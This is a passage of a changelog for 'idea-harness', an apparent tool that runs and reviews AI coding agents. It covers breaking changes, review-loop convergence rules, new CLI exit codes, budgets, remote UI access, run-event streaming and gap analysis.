# Changelog

All notable changes to idea-harness are recorded here, following
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

Versioning is pre-1.0: the CLI surface, the HTTP API, and the on-disk config schema may change in
any release. Breaking changes are listed under **Changed** or **Removed** with the migration in the
entry itself. Once 1.0 ships, this project follows semantic versioning.

## [Unreleased]

### Changed — BREAKING

| Was | Now |
|---|---|
| A change set's diff could touch any number of files; nothing capped it before the adversarial review ran | `idea execute` refuses a change set whose diff touches more than `execute.max_files` files (default `10`) **before** the adversarial review ever runs, with a message naming the count, the limit, and the two ways forward: split the task (`POST .../tasks/{id}/split`) and execute each piece, or raise `execute.max_files` in `harness.yaml`. The count excludes whatever `fsdiff` already excludes (well-known-dir list, control-plane paths, and — for the produced image — the workspace's own `.gitignore`), so a lockfile regen or another generated/ignored file never trips it. The change set still exists, `rejected`, with a `blast_radius` finding; the task returns to `proposed` (the same recovery a secret-sweep denial already uses), so it is neither stuck nor silently marked done. **Consumer impact**: a multi-file task that used to execute cleanly now refuses once its diff exceeds 10 files — split the task or raise the limit. |
| An unset `executor.kind` meant `internal`: `idea execute` wrote a placeholder file, with a one-line hint, whether or not a model key and Docker were available | An unset kind means **`auto`**: `hermes` on the digest-pinned image when Docker is reachable and the coding model's provider key is set (the first run pulls the multi-gigabyte image and makes paid model calls), otherwise `internal` with a `NO REAL CODE WILL BE WRITTEN` warning on `idea execute`/`idea next`, `idea doctor`, the Build page guidance, `GET /executors`, the change set's agent output and the run manifest. **Migration:** set `executor.kind: internal` to keep the placeholder. Projects created by an earlier `idea init` already have `kind: internal` written and are unaffected until that line is removed; a new `idea init` writes `kind: auto`. A keyless provider (Ollama) is never auto-picked. |
| `ExecutorKind` (`harness.yaml` schema, OpenAPI) was `internal \| container \| omp \| hermes` | Adds `auto`, `acp` and `openhands`. `POST …/execute`'s `executor_kind` can now be `auto`; the kind that actually runs is in the new `executor_resolved`. A client switching on `executor_kind == "internal"` to warn about placeholders should read `executor_warning` / `executor_resolved` instead. |
| The default Hermes image was `nousresearch/hermes-agent:v2026.5.16` (tag only) | `nousresearch/hermes-agent:v2026.5.16@sha256:b6e41c15…` (same bytes, pinned by index digest). `harness.yaml` files that stored the tag-only default keep working, unverified; `idea executors setup` now writes the digest form. |
| A plain `idea review <CHG-n> approve` approved any change set whose review raised no blocking finding | A change set touching an auto-executing path (CI definitions, tree-installed git hooks, `.envrc`, `.devcontainer/`, `.vscode/tasks.json`) gets a blocking `protected_path` finding, and one whose produced files hold a payment card number or a dashed US SSN gets a blocking `pii` finding; a plain approve refuses both (details under Security). **Migration:** a script that approves change sets must handle the refusal — `--accept-findings` signs off `protected_path`; a `pii` finding needs its own `accepted_risk` disposition (the web UI, or `POST …/findings/{id}/disposition`), which `--accept-findings` never covers. |
| `idea verify` completed an initiative once every requirement had passing (or waived) evidence | It measures quality dimensions first, and at an effective `review.rigor` of `thorough` — set explicitly, or `auto` calibrating to it on a large project or change — `setup_reproducibility`, `docs_completeness` and `api_compatibility` are gates: each must pass (`not_measured` does not) before the initiative completes, and `idea verify` exits `5` until they do. `quick` and `standard` gate nothing. **Migration:** set `verify.dimensions.<dimension>: advisory` (or `off`) for any dimension that should not hold the gate. |
| The PRD review loop ran up to `review.max_cycles` passes, every critical/high finding blocking | `review.convergence.mode: guarded` by default: an uncited finding, or a non-critical one first raised after cycle 1 about a requirement the revision did not change, is advisory; re-raises are de-duplicated; and the loop parks for a human as soon as the open blocking count stops falling — a persistent cited blocker now parks at cycle 2, not 3, and so does `demo.block_review_cycles` of 2 or more (details under Changed). **Migration:** `review.convergence.mode: legacy` restores the previous loop exactly. |
| Initiatives had no objectives | The PRD states objectives and outcome metrics, and the chain is checked. An initiative with requirements and no active objective — every initiative created before this release — has one medium `objectives_missing` gap, so `idea gaps --fail-on medium` (or lower) fails on it, and a PRD review over a PRD with no objectives raises one medium finding; once objectives exist, a requirement serving none is a high finding, which blocks the PRD review. **Migration:** `idea objective add "<statement>"` and `idea objective link <REQ> <OBJ>` (or the Define page) where you want the chain; otherwise start a CI gate at `idea gaps --fail-on high`. |

- **CLI exit codes now say what kind of failure it was** (deferred.md, audit 8 / E2). Every failure
  used to exit `1`. The taxonomy is in [docs/cli.md](docs/cli.md#exit-codes): `2` usage, `3` not
  found, `4` conflict, `5` gate unmet, `6` daemon unavailable, `7` unauthorized, `8` config invalid,
  `9` a run failed; `1` remains for anything not classified. A script that tested `$? -eq 1` must
  test `$? -ne 0` (or the specific code); one that tested for non-zero is unaffected.

  | | Was | Now |
  |---|---|---|
  | Unknown command, subcommand or flag; missing or extra argument; daemon `400`/`405`/`413` | exit `1` | exit `2` (`usage`) |
  | A reference that matches nothing; daemon `404` | exit `1` | exit `3` (`not_found`) |
  | Daemon `409` (state does not allow it); `idea revise` under an approved plan | exit `1` | exit `4` (`conflict`) |
  | `idea verify` / `idea verify --json` over an unmet gate | exit `1` | exit `5` (`gate_unmet`) |
  | The daemon cannot be reached, started, or is not initialized; `idea daemon status` when it is down | exit `1` | exit `6` (`daemon_unavailable`) |
  | Daemon `401`/`403`; `idea doctor` finding the token rejected | exit `1` | exit `7` (`unauthorized`) |
  | Daemon `422`; `idea config validate` with errors; no model or API key configured | exit `1` | exit `8` (`config_invalid`) |
  | `idea status` over a failed initiative; a waited-on operation failing or cancelled; `idea next` reaching a failed initiative; `executors setup --smoke` failing | exit `1` | exit `9` (`run_failed`) |
  | Any failure under `--json` | the `idea: …` line on stderr, nothing on stdout | `{"error":{"kind","message","hint","exit_code","http_status"}}` on stdout — or on stderr when the command already printed its payload, so stdout always holds exactly one JSON document |

### Changed

- **The README is shorter and shows how to use the web UI.** It now covers install, a quick
  start, a "Using the web UI" section with a screenshot, and short summaries that link to the
  reference docs. Detail moved, not dropped: the drift rules and the objectives walkthrough are in
  `docs/configuration.md` (Objectives & outcomes, Drift), and the supported-platforms table is in
  `RELEASING.md` (Platforms). `docs/ui.md` no longer says the project is not selectable.

- **Every `harness.yaml` write keeps your comments and key order, and is validated like a load.**
  `idea model set`, `idea executors setup` and the Settings saves used to re-marshal the whole file
  (dropping every comment) and checked only `network`, so a write could produce a file the next
  load refused. The write path now runs the schema, the inline-secret sweep and the structural
  checks before writing, and merges onto the existing document's comments. The written file is
  indented with two spaces (it was four).
- Strict (closed) request bodies on the five new write endpoints from their first release:
  `PUT …/integrations/{name}`, `PUT …/budget`, `PUT …/initiatives/{id}/budget`,
  `PUT …/automations/{name}` and `POST …/automations/{name}/run`. Not a breaking change: none
  existed before.
- The project event stream's SSE id is now `<event seq>.<run event id>`. A client that stored a bare
  `<event seq>` still resumes correctly (run events start at now); one that parsed the id as an
  integer must split on `.`.
- `?token=` is accepted only on the two SSE streams' exact paths; it was accepted on any path ending
  in `/events`.
- The README's real-model numbers (PRD review did not converge in 2 of 2 runs) are now labelled as
  measured before the convergence rules existed; they need re-measuring with `idea eval --model`.
- **The PRD review loop converges on principle instead of by exhaustion** (`review.convergence`,
  `guarded` by default). In 2 of 2 measured real-model runs the PRD review never converged, and the
  causes were in the loop, not the model: the reviewer never saw the previous cycle's findings or
  what the revision did about them; one critical/high finding anywhere blocked, cited or not, new or
  rephrased; re-raises had no identity across cycles; the reviser got every finding ever raised as
  bare "[severity] text"; and nothing measured progress. Now the reviewer receives the previous
  cycle's blocking findings by label with the reviser's response to each, must justify re-raising
  an addressed one, and must cite the requirement (or task, or quoted idea text) a blocking finding
  is about; a finding first raised after cycle 1 blocks only if it is about a requirement the
  revision changed, or is critical; re-raises are matched with the existing near-duplicate
  similarity and the superseded finding is dispositioned `duplicate`; the reviser gets a precise,
  labelled brief and answers it in `review_responses`; and the loop stops for a human as soon as the
  open blocking count fails to fall (`stall_cycles`, default 1). Demoted findings are kept, marked
  advisory, with the rule on their note. Deterministic checks are untouched, and a cited blocker
  that persists with a reason still parks the initiative — now at cycle 2 rather than 3. The plan
  review applies the per-finding rules (severity floor, citation). `review.convergence.mode: legacy`
  restores the previous loop exactly.
- **`demo.block_review_cycles` now parks at cycle 2** for any value of 2 or more, by the stall
  detector, instead of running to `review.max_cycles`. The demo blocking finding cites the first
  listed requirement and justifies its re-raise, so it behaves as a genuine blocker under the new
  rules.
- The `product_manager` and `adversarial_reviewer` role contracts are at **1.2.0**. 1.1.0 added
  citation, severity, re-raise and precise-revision behaviors; 1.2.0 has the product manager state
  objectives with measurable metrics and link every requirement to the objective(s) it serves, and
  the reviewer challenge a requirement serving no objective and an objective with no measurable
  metric, citing the `REQ`/`OBJ`/`MET` code.
- The PRD schema (`schema.PRD`) gains `objectives[]` (each with `metrics[]`) and a per-requirement
  `objectives[]`. Both are optional, so an older scripted response still validates. The PRD and
  review prompts are longer by the schema text and an objectives section; the scripted eval
  baseline moved only in its nominal token counts.
- `Requirement` (API) gains `objective_ids` (always an array); `Guidance` gains `outcomes` when
  anything is drifting. `why`/`impact`/`trace` accept the node types `objective`, `metric`,
  `assertion` and `change_set`, and `impact` now continues past a task's change sets to the outcome
  metrics attributed to them.

### Added

- **Cross-initiative project memory + a constitution.** Resolving a decision now appends
  `DEC-x: question → resolution` to a project-wide `project_memory` table (in the same
  transaction), and every stage and reviewer reads the most recent entries as authoritative
  `project_memory` context. `harness.yaml` gains a `constitution:` list of immutable principles
  injected into every model call as `project_policy` — a reviewer flags violations.
- **Uncertainty markers.** The framing/PRD stages are told to emit `[NEEDS CLARIFICATION]`
  instead of guessing at a missing input; the marker is recorded on the question
  (`needs_clarification`, migration 50) and stripped from its text. `idea approve` refuses (409)
  while an open flagged question remains, scoped so ordinary open questions still do not block.
- **Requirement→task coverage gate.** Plan review's deterministic checks now also flag every
  live requirement with no implementing task (an `EdgeVerifies` does not count), closing the
  direction that previously only `idea gaps` reported non-blocking.
- **Requirement deltas.** Each requirement now carries a derived `change_kind` — `added`,
  `modified` (revised in place, `revised_at` set by migration 52), or `removed` (superseded) —
  computed at read time from the row's own lifecycle rather than a stored column that could
  drift.
- **Brownfield initiatives (`idea new --from <initiative>`).** Seed a new initiative from an
  existing one's live requirements (codes preserved) so the PRD revises them into an
  added/modified/removed delta instead of authoring from scratch — the `change_kind` field above
  is the surface of that delta.
- **Parallel task execution (`execute.max_parallel`).** Set `execute.max_parallel: N` (default `1`)
  and `idea execute` runs up to N independent ready tasks in one wave — each in its own work root
  and partial, with per-task live state — instead of one at a time. A dependent task runs only
  once its `depends_on` predecessor is applied; independent tasks editing overlapping files are
  caught at apply by the stale-base guard.
- **`docs/failure-modes.md`.** Five classes of refusal/stall a founder journey actually hit,
  each as symptom → diagnostic command → expected output → recovery, quoting the real message
  verbatim (several are `%s`-templated, shown as a rendered example): a change set whose
  adversarial review never completed, and the task that then won't re-run — two symptoms of
  one guard in `execute.go` (`Status == ChangeSetReviewRequired && !ReviewCompleted()`), not two
  defects; a change set the secret sweep rejected, including what `not_a_secret` does and does
  not unblock (one value, one file — there is no CLI verb for it yet, so the page names the API
  call directly); a no-op (zero-file) change set; a revert refused because the workspace changed
  since apply; and a review truncated at the model's output ceiling, including what
  `review.max_tokens` actually overrides and `--accept-findings`/`rerun` as the way forward.
  `internal/docsgen`'s new `TestFailureModesDocMessagesMatchCode` fails if any quoted message
  drifts from the code that emits it (matched as a wildcarded format string, not a rendered
  string), and `TestFailureModesDocCommandsAreReal` anchors every command/route the page names
  against `internal/cli/testdata/help.txt` and `internal/daemon/routes.go`. Linked from
  `README.md` and `docs/quickstart.md`.
- **CLI verbs for plan editing**, the five the API and web UI already had and
  the CLI did not (ICP re-run 5): `idea add-task "<title>" --requirement
  <ref>` (at least one `--requirement` is required, refused locally before the
  round trip), `idea merge-tasks <task1> <task2> --yes` (deletes the second;
  `--yes` required, matching `idea executors setup`'s own security-tradeoff
  gate), `idea split-task <task> --title "<t>" --requirements <ref>[,<ref>...]
  --yes` (repeat `--title`/`--requirements`/`--statement` in order, at least
  twice), `idea depends-on <task> --on <ref>|--clear`, and `idea reorder
  <task1> <task2> ... [--initiative <ref>]`. Every verb resolves a task by id,
  code, or title against `idea tasks`, the way the server's own
  `resolveTaskRefs` already does for a `depends_on` list's members — the CLI
  now does the same for the task a merge/split/depends-on/reorder verb acts
  *on*, which is a raw id on every one of those endpoints. An evaluator
  editing a plan from the CLI had to drop to raw HTTP twice; this closes that.
- **`idea disposition <finding> <disposition>`**, the other missing judgment
  verb (audit 6 / D1): `POST .../findings/{id}/disposition` had no CLI caller
  at all, and the daemon's own guidance for a secret-sweep denial told a user
  to run `idea reviews` to "disposition" a finding, which only ever listed
  them — a user hitting a secret denial was told to use a capability that did
  not exist. `not_a_secret` is refused locally (before the round trip) on
  anything but a `secret_sweep` finding, and refused again, unconditionally,
  on a match drawn from the project's own configured secrets; a `rejected`
  disposition's server-reported warning (a system deny code still blocks) is
  printed, not swallowed; `--note` additionally records a free-text note in
  the same command. `idea reviews`' human output now shows each finding's
  short ref (it showed none before, so the only way to learn one was
  `--json`).

- **Every initiative's remote runs in the UI.** `#/runs` (the sidebar's **Remote runs**, or ⌘K)
  lists the project's OpenHands remote runs across initiatives, newest first, each linking to its
  initiative's Build, with **Only runs not yet over** for `?active=true` — the UI side of
  `idea runs remote --all`, which makes `runs remote` `ui` in the parity ledger. It reads the
  existing `GET /projects/{projectId}/remote-runs`; no API change.
- **The artifact diff is in the viewport sweep.** `web/e2e/views.e2e.ts` used to add the diff
  route only when the first artifact kind had two versions, which it never did, so the route was
  never checked. The sweep now seeds a second initiative with a revised PRD whose diff has added
  and removed lines, checks both render, and runs the usual one-h1, overflow and axe checks on it
  at 390px and 1280px.
- **Edit every field of a metric from the Define page.** The metric edit form adds guardrail
  (blank clears it), cadence, definition, source — recorded by hand, a command, or a URL with a JSON
  pointer — and, with more than one objective, which objective it measures; `metric edit` is now
  `ui` in the parity ledger. The form refuses what the API refuses before sending (a cadence
  `ParseCadence` rejects, a negative guardrail on a maintain metric, a command source with no
  command, a non-http(s) URL, a pointer not starting with `/`) and sends a changed source whole.
- **List the OpenHands executor's remote runs.** `idea runs remote [<initiative>] [--all] [--json]`,
  `GET …/initiatives/{id}/remote-runs` and `GET …/remote-runs` (project-wide, `?active=true` for the
  runs not yet over) list every dispatch to an Agent Server, newest first: task, status, attempt,
  server, conversation id, the progress log's last line, and the error. The run panel shows the same
  rows under **Remote runs** when the run's executor is `openhands`. Until now they were readable
  only from `state.db`.
- **Requirements and decisions now say which assertions they rest on, so assumption gaps fire on
  real runs.** Assertions get initiative-scoped codes (`ASM-n`; migration 48 numbers existing rows
  in creation order, and `Assertion.code` is a new required field in the API). The PRD prompt lists
  them, and the PRD schema gains a per-requirement and per-decision `based_on` (ASM codes); each
  citation is written as `requirement|decision --derived_from--> assertion`. A requirement revised in
  place has its basis replaced, a re-listed decision's is added to, and an unknown code is skipped.
  Research findings may name a framing assumption they `supports` or `contradicts` (new optional
  fields; `assertion --supports|contradicts--> assertion`). Until now nothing wrote these edges, so
  `basis_refuted` and an assumption's dependents only ever appeared in tests: now `idea assumption
  ASM-3 retract` on a hypothesis a decided decision rests on reports `basis_refuted` on the decision,
  and an unvalidated assumption a requirement rests on is medium, not low. The PRD reviewer is shown
  the assertions requirements rest on, with status, and may raise a cited medium `basis` finding on a
  requirement resting on an unvalidated, disputed or retracted assumption or hypothesis. `idea
  assumption` accepts the code as well as an id prefix, and gaps name assertions by code. The
  `product_manager` and `adversarial_reviewer` contracts are at **1.3.0**, `research_analyst` at
  **1.1.0**. The demo provider's requirement cites the two research findings and the scripted eval's
  first requirement cites the research hypotheses, so both graphs carry basis edges; the scripted
  baseline moved only in its nominal token counts (the prompts list the assertions).

- **Retracting an assertion writes `invalidates` edges.** The edge type was declared and read by
  `basis_refuted`, but nothing wrote it. Now `idea assumption ASM-n retract` (or `POST
  …/assertions/{id}/status`) writes `assertion --invalidates--> requirement|decision` for each live
  node resting on it, with an `assertion.invalidates_set` event. The set is reconciled: repeating
  the retraction writes nothing, accepting or disputing the assertion later removes the edges, a
  PRD cycle citing an already-retracted assertion gains one, and a revision dropping the citation
  loses it. `idea why` (and the lineage page's Why) lists the edge on the invalidated node; `idea
  impact` on the assertion classes those nodes `obsolete` instead of `revalidate`. Impact and gap
  `dependents` no longer follow an incoming `invalidates` edge, so the invalidator is not counted
  as the node's dependent; `basis_refuted` lists the assertion once. No migration.

- **`idea ui pair --qr`** draws the sign-in address as a QR code in the terminal (UTF-8 half
  blocks, black on white whatever the theme), so a phone's camera opens the page. The pairing code
  is printed beside it and is never in it: codes never go in URLs. Encoded with `rsc.io/qr`
  (BSD-3-Clause, pure Go); the tests decode what was drawn with an independent decoder, Reed-Solomon
  check included.
- **Push notifications survive the push service replacing a subscription.** The service worker
  now handles `pushsubscriptionchange` (`web/public/sw-push.js`): it re-subscribes with the
  daemon's VAPID key when the browser does not hand it a new subscription, and posts the new one
  to `POST /api/v1/projects/{projectId}/push/subscriptions/{id}/renew` for every project this
  browser had notifications on in. The worker has no API token and maybe no session, so each
  subscription gets a renewal token at subscribe time (`renewal_token` in the subscribe response,
  stored hashed — migration 49), kept in IndexedDB; it can only re-point that one subscription and
  rotates with each use. Previously a rotated subscription went silent until the push service
  answered 410. Threat notes in `docs/security-model.md` (Remote access).
- **Use the UI from your phone or another computer, without the token leaving the machine.**
  Opt-in, daemon-wide, in `<state root>/config.yaml` (`daemon:`) or `idea daemon` flags:
  `allowed_hosts` for a proxy in front of loopback (`tailscale serve` is the recommended path),
  or `listen` for a second listener — refused unless it is a Tailscale or private address or TLS
  is configured (`tls_cert`/`tls_key`). Loopback behaves exactly as before. A remote browser signs
  in with a one-time code from **`idea ui pair`** for an expiring, revocable session cookie;
  **`idea ui sessions [revoke <id>|--all]`** and Settings → Remote access list and revoke them. The
  model and its limits: [docs/security-model.md](docs/security-model.md#remote-access); setup:
  [docs/configuration.md](docs/configuration.md#remote-access).
- **Web Push notifications** for *needs your judgment*, *change set ready for review*,
  *verification failed* and *outcome drifting*, chosen per browser in Settings → Notifications.
  Each subscription is a subscriber on the integration bus, with Slack's outbox, retries and dead
  letters; payloads are encrypted (RFC 8291) and VAPID-signed (RFC 8292) by a new stdlib-only
  `internal/webpush`, tested against the RFC's own vector. VAPID keys live under the state root.
- **Project switcher**, and **`#/p/<projectId>/…`** deep links: the address names its project,
  and the last choice is remembered.
- **Phone-first review**: wrapped, collapsible per-file diffs with `+/−` counts, a sticky
  Approve / Request changes / Reject bar with **Reject with this note**, a **Needs you** entry in
  the top bar.
- **Installable app**: web manifest, icons, and a service worker that serves an offline page and
  caches hashed assets only — never the HTML (which can carry the token) or `/api/`.
- API: `POST /ui/pairing-codes`, `POST /ui/login`, `POST /ui/logout`, `GET /ui/session`,
  `GET|DELETE /ui/sessions`, `DELETE /ui/sessions/{id}`, `GET /push/vapid-public-key`, and
  `GET|POST /projects/{projectId}/push/subscriptions`, `PATCH|DELETE …/{id}`, `POST …/{id}/test`.
  Migrations: global.db 2 (sessions, pairing codes) and 3 (per-code failure counts), state.db 46 (push subscriptions).

- **Keyboard and accessibility in the web UI** ([docs/ui.md](docs/ui.md#keyboard-and-accessibility)).
  A **Skip to content** link is the first Tab stop; after a route change focus moves to the new
  page's heading; the command palette, a new **`?` shortcut reference**, and inline forms (Request
  changes, Ask for a revision, the revert confirmation, Write my own…, objective and metric edits)
  take focus when they open, close on Escape and give focus back to the button that opened them
  (the two modals also keep Tab inside). **⌘/Ctrl+Enter** sends the focused note — the run note,
  Request changes, a plan revision, a retry, a note to the running agent. One polite live region
  says when a change-set action lands ("CHG-2 applied."), when an operation or agent run starts or
  ends, and when an objective or metric is saved — never per streamed event (the run panel's
  action chip is no longer a live region). `prefers-reduced-motion` stops spinners, pulses and
  transitions. The home cards' titles are buttons (the card was a mouse-only `<section onClick>`),
  and Plan's ↑/↓ buttons say which task they move.
- **The command palette (⌘K) reaches every page**: Gaps, Outcomes, Quality, Activity, Graph health,
  Needs you, Settings and each Settings section (focus lands on the section), and a typed node
  code — `REQ-3`, `TASK-2`, `OBJ-1`, `MET-1`, `DEC-1`, `CHG-1` — opens that node's lineage.
- **Edit objectives and metrics, and unlink a requirement, on the Define page** — `idea objective
  edit` (statement, rationale, owner, status), `idea metric edit` (name, direction, baseline —
  blank clears it — target, unit) and `idea objective link --unlink` (the × beside each serving
  requirement). Only changed fields are sent. In the parity ledger `objective edit` is now `ui` and
  `metric edit` `partial` (guardrail, cadence, definition and source stay CLI-only).
- **The browser suite checks accessibility in the dark colour scheme too.** `expectAccessible`
  runs axe under `prefers-color-scheme: light` and `dark` on every page, and now also covers the
  queue, Design, the document reader, the command palette and the shortcut reference.

- **Spending caps per initiative** ([docs/configuration.md](docs/configuration.md#budget)).
  `budget.default_initiative_usd` caps every initiative; `idea budget <initiative> --set <usd>` (or
  the Build page's meter, or `PUT …/initiatives/{id}/budget`) sets one initiative's own. The cap is
  checked before every model call and before the coding agent starts, for every executor kind
  (`acp` and `openhands` included); reaching it parks the initiative on `needs_human_judgment` with
  the new reason `budget_exceeded` (`idea next`: `resolve budget`) and publishes
  `initiative.budget_exceeded` on the integration bus. Raising the cap returns the initiative to
  where it stopped. Spend is the initiative's recorded spend (`GET …/costs`); a coding agent that
  reports no cost (hermes, omp) is stated as not counted. The meter shows in the initiative header
  and on Build; `idea budget` with no initiative lists every meter and `--set` there sets the
  project default. `idea eval --max-cost <usd>` caps a whole eval run the same way.
- **Automations** (`#/automations`, [docs/configuration.md](docs/configuration.md#automations)):
  every background job in one place, each off until enabled, with its schedule, last and next run,
  history (status, cost) and Run now. Linear inbound polling (existing; its switch is still
  `integrations.linear.inbound`), **scheduled metric measurement** (new:
  `automations.metric_measurement` measures command/url metrics on each one's cadence, at most every
  15 minutes, still honouring `outcomes.allow_url_sources`) and a **scheduled eval** (new:
  `automations.eval` runs `idea eval` against a configured model every `interval_hours`, capped at
  `max_cost_usd` per run, writes reports to the project's state directory and publishes
  `eval.regressed` when it regresses against its baseline). Run history is kept in the project
  database (migration 47, with the spending caps). API: `GET/PUT …/automations[/{name}]`, `POST …/automations/{name}/run`.
- **Integrations and executor profiles are editable in Settings.** Slack (channel, events, who is
  mentioned, who may act) and Linear (team, project, inbound label, poll interval, state mapping)
  through `PUT …/integrations/{name}`, showing whether each token variable is set and never a
  value; the executor profile — kind, image, model, the ACP command/key variable/timeout, the
  OpenHands server/agent/key withholding/UI link, and `executor.mcp_servers` (stdio, http, sse;
  each env var or header a literal or a variable name, secret-looking literals refused) — through
  `PUT …/executors` and the new `GET …/executors/config`, with each kind's trust trade-off and the
  executor/model compatibility advisory beside it.
- `demo.cost_per_call_usd`: the demo provider reports a cost per call, so a spending cap can be
  reached in CI and the browser suite without a real provider.

- **The web UI shows the Product Graph** ([docs/ui.md](docs/ui.md#product-graph-views)). A lineage
  page per node (`#/i/<id>/lineage/<type>/<ref>`: provenance tree, dependents with staleness, full
  edge trace — what `idea why/impact/trace` print), and a lazy **Why / Impact** panel on
  requirements (Define), tasks (Plan), change sets (Build), decisions, objectives and metrics. A
  sidebar **Product graph** group opens three new pages: **Gaps** (the whole `idea gaps` report,
  grouped and filterable, each gap with its closing action — assumption judgments in place, links to
  the page that closes it, the CLI command to copy otherwise), **Outcomes** (per objective, each
  metric's progress, drift with reasons, an inline-SVG sparkline, observation history with the change
  sets that landed between readings, record and measure) and **Quality** (every dimension's checks,
  methods, citations, linked requirements and measurement history). Define and Plan gain a review
  convergence timeline; Graph health gains a chain diagram and a **See all** link to Gaps.
- **`GET …/initiatives/{id}/review-telemetry`** (`?review=prd|execution_plan`): every review
  cycle's convergence record — findings raised, new, re-raised and resolved by severity, demotions by
  rule, open blocking count, outcome — read from the reviewer runs' manifests, oldest first.
- **`GET …/initiatives/{id}/quality/history`** (`?dimension=`): every recorded quality result,
  oldest first, with its linked requirement codes; an unknown dimension is a 400.

- **A browser suite with an accessibility gate: `make e2e`** (`web/e2e`, Playwright + Chromium), and a
  CI job that gates the release. It starts a hermetic demo daemon (isolated state dir and port, every
  provider key unset), seeds an initiative, and drives idea → PRD → answer → plan and a no-op
  revision → run with a note → diff → request changes with a note → approve → apply → verify →
  activity and health, with an axe check (WCAG 2 A/AA) on every page that fails on serious or
  critical violations. Fixing what it found raised `--text-faint`, `--text-muted`, `--inactive-fg`
  and the primary green button to AA contrast and labelled Settings' Add-provider fields.
- **Component tests** in jsdom (`web/src/components.test.tsx`, `@testing-library/react`) against a
  stubbed daemon, for the note inputs, the change-set chip, NotFound, the decision page and
  Settings' executor display.
- **CLI/UI parity ledger** ([docs/ui-parity.md](docs/ui-parity.md)): every CLI verb with its UI
  surface or the reason it is CLI-only (47 ui, 10 partial, 17 CLI-only today).
  `TestUIParityLedger` fails when a verb is added without a row.
- `GET …/questions` returns an answered question's `answer` text.

- **Request changes says what to change.** `idea review <CHG> changes_requested --note "..."` (and
  `reject --note`), `POST …/change-sets/{id}/review {"note"}`, and a note field behind Build's
  **Request changes…**: the note is stored on the change set (`review_note`, migration 43) and
  appended to the implementer's brief on the task's next run, labelled with the change set it came
  from — that run only. Before, the verdict was all that was recorded and the rerun had the same
  brief that produced the rejected work. A note with `approve` or `rerun` is a 400.
- **`idea revise-plan --note "..."`, `POST …/revise-plan {"note"}`**, and a note field behind Plan's
  **Ask for a revision**: the note joins the planner's inputs for that revision and is recorded on
  its run.

- **Live run view.** Every executor now narrates a coding agent's run as normalized **run events**
  (`action`, `tool_call`, `tool_result`, `file_change`, `permission`, `message`, `thought`, `cost`,
  `status`, `error`): ACP from its `session/update` notifications, fs writes and permission
  answers; OpenHands from the Agent Server's events (exactly once, across daemon restarts); hermes,
  omp and container from their output and a work-root scan; internal from a few synthetic events.
  Events are redacted, bounded (per event, 5000 per run, 50 runs per project) and stored in a new
  `run_events` table (migration 44, which also adds `remote_runs.run_id`) with a per-run `seq`.
  The Build page's running card shows them in a run panel:
  the current action, grouped tool calls, files with +/- counts, permissions answered, tokens, cost
  and elapsed time, errors. See [docs/ui.md](docs/ui.md#run-panel) and
  [docs/api.md](docs/api.md#run-events).
- **Streaming that resumes.** `GET …/runs/{runId}/events` (paged) and
  `GET …/runs/{runId}/events/stream` (SSE, resumes from `Last-Event-ID` or `?after=` - only what
  was missed, never the whole run - and ends with `event: end`); `GET …/initiatives/{id}/current-run`.
  The project stream `GET …/events` now also carries `run_event` messages, sends heartbeats and
  proxy-friendly headers, and accepts `?after=` (including `now`). The UI follows the streams
  instead of polling, with backoff, visibility awareness and a polling fallback.
- **Steering.** `POST …/runs/{runId}/steer` sends a note to a running agent: ACP as its next prompt
  turn (or at once, ending the current turn, with `interrupt`), OpenHands as a message into the
  conversation; other executors answer `steering not supported by <kind>` and the note rides on the
  task's next run. A held note is stored (migration 45, `held_steering_notes`, redacted), so a
  daemon restart before that run no longer drops it, and the run takes each one exactly once.
  Notes are recorded on the run's events and manifest. See
  [docs/agents.md](docs/agents.md#steering-a-running-agent).
- **`idea run events` and `idea steer`.** The run panel from a terminal: `idea run events
  <run-id|current> [--follow] [--json]` prints a run's events one per line (NDJSON with `--json`),
  and `--follow` tails the live stream, resuming after a dropped connection, until the run ends;
  `idea steer <run-id|current> "<note>" [--interrupt]` sends a steering note and says what became
  of it. Steering a run that is not running exits `4` (`conflict`), pointing at
  `idea execute --note`.
- **Open in OpenHands.** Optional `executor.openhands.ui_url` links each OpenHands run to its
  conversation in that UI.
- **Run report.** `GET …/runs/{runId}/report?format=json|md|zip`: events, files with line counts,
  findings, cost and steering notes, from the run panel's Report buttons.
- **`idea gaps`: a deterministic gap analysis over the Product Graph.** One command answers "what is
  missing or no longer holds" — no model call, every trigger a comparison of recorded state:
  `unimplemented_requirement` (no task / no applied change set), `unverified_requirement` (evidence
  failed, evidence **stale** because the code changed after the pass was recorded, or no acceptance
  criteria at all), `untested_acceptance_criterion`, `unvalidated_assumption` (ranked by how many
  live nodes rest on it), `invalidated_decision` (dependents stale since it changed, a citing
  requirement revised after it was decided, a refuted basis, or every citing requirement removed),
  `orphan_task`, `orphan_change_set` and `stale_artifact` — and the outcome chain:
  `orphan_requirement` (a requirement serving no active objective, high; or, when no objective is
  defined at all, one medium `objectives_missing` gap, matching the PRD review), `unmeasured_objective`
  (no measurable metric, high), `unserved_objective` (no requirement serves it, medium),
  `drifting_metric` (`regressed` high, `off_track` medium or high on a guardrail breach, `stale`
  low; `no_data` is not a gap) and `ineffective_requirement` (verified, but an objective it serves
  has an off-track or regressed metric: "works, but fails its objective", high). Each gap carries a stable `kind`, a
  `state` naming the trigger, a severity, the nodes (REQ-3, REQ-3/AC-2, TASK-2, CHG-4, DEC-1), a
  one-line why and the command that closes it. `--kind` filters, `--all` covers every initiative,
  `--json` is machine-readable, and `--fail-on <severity>` exits `5` (`gate_unmet`) so it can gate
  CI; without it the command exits `0`. An initiative created before objectives existed carries a
  medium `objectives_missing` gap, so a new CI gate is best started at `--fail-on high` (see
  Changed — BREAKING). Exact triggers:
  [architecture.md](docs/architecture.md#asking-the-graph-gaps). Also served as
  `GET …/initiatives/{id}/gaps` and `GET /projects/{projectId}/gaps`, the read-only MCP `gaps`
  tool, a **Product gaps** list on the web UI's Health page, and a `gap_summary` on `/guidance`
  that `idea status` prints as one line.
- **`idea assumption <id> accept|dispute|retract`** (`POST /projects/{projectId}/assertions/{id}/status`)
  records a human judgment on an assumption or hypothesis. Nothing moved an assertion out of
  `candidate` before, so an unvalidated assumption could be reported but never closed.

- **`executor.kind: openhands` delegates the agent run to an OpenHands Agent Server**
  ([docs/agents.md](docs/agents.md#openhands-agent-server-kind-openhands)). The server is the
  execution plane; approval, workflow state, the change set and its review stay here. The work root
  is uploaded as one tarball and the result downloaded back into the local work root, validated in
  a staging directory first, so the snapshot → diff → secret sweep → review → apply pipeline is
